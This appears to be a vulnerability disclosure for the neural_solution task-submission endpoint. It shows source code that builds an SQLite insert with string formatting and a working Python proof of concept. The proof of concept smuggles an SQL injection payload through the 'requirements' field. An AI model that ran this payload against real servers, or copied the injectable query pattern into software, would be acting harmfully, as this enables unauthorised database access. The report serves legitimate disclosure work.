## Description

`neural_solution`'s `@app.post("/task/submit/")` used `.format(` to construct it's SQLi commands. this results SQL injection

## Source-to-Sink

In `neural-compressor/neural_solution/frontend/fastapi/main_server.py`, Here defined the `@app.post("/task/submit/")` endpoint

```python
@app.post("/task/submit/")
async def submit_task(task: Task):
    """Submit task.

    Args:
        task (Task): _description_
        Fields:
            task_id: The task id
            arguments: The task command
            workers: The requested resource unit number
            status: The status of the task: pending/running/done
            result: The result of the task, which is only value-assigned when the task is done

    Returns:
        json: status , id of task and messages.
    """
    if not is_valid_task(task.dict()):
        raise HTTPException(status_code=422, detail="Invalid task")

    msg = "Task submitted successfully"
    status = "successfully"
    # search the current
    db_path = get_db_path(config.workspace)

    if os.path.isfile(db_path):
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        task_id = str(uuid.uuid4()).replace("-", "")
        sql = (
            r"insert into task(id, script_url, optimized, arguments, approach, requirements, workers, status)"
            + r" values ('{}', '{}', {}, '{}', '{}', '{}', {}, 'pending')".format(
                task_id,
                task.script_url,
                task.optimized,
                list_to_string(task.arguments),
                task.approach,
                list_to_string(task.requirements),
                task.workers,
            )
        )
        cursor.execute(sql)
        conn.commit()
        try:
            task_submitter.submit_task(task_id)
        except ConnectionRefusedError:
            msg = "Task Submitted fail! Make sure Neural Solution runner is running!"
            status = "failed"
        except Exception as e:
            msg = "Task Submitted fail! {}".format(e)
            status = "failed"
        conn.close()
    else:
        msg = "Task Submitted fail! db not found!"
        return {"msg": msg}  # TODO to align with return message when submit task successfully
    return {"status": status, "task_id": task_id, "msg": msg}
```

## PoC

**PoC Demo: https://drive.google.com/file/d/1POPfybmIBuNq_n2-526PwV_s_CC7dGpV/view?usp=drive_link**

1. `pip install neural_solution` _(Best with python3.8)_
2. `neural_solution start`
3. Run:

```python
import requests
import json

def exploit():
    session = requests.Session()
    session.trust_env = False

    url = "http://localhost:8000"

    malicious_task = {
        "task_id": "1",
        "script_url": "http://example.com/script",
        "optimized": False,
        "arguments": ["arg2", "arg2"],
        "approach": "default",
        "requirements": ["requirement1", "requirement2', 1, sqlite_version());--+1;"],
        "workers": 1,
        "status": "123123",
        "result": None
    }

    print("[!] Request 1: /task/submit/")
    response = session.post(url+'/task/submit/', data=json.dumps(malicious_task), headers={"Content-Type": "application/json"})
    taskid=json.loads(response.content)['task_id']

    print(f"\t[*] Code:{response.status_code}")
    print(f"\t[*] Task ID: {taskid}")

    # @app.get("/task/{task_id}")
    print("[!] Request 2: /task/{taskid}/")
    response = session.get(
        url+f'/task/{taskid}'
    )

    print(f"\t[*] We got: {json.loads(response.content)['status']}")
    
exploit()
```

# Impact

SQLi Injection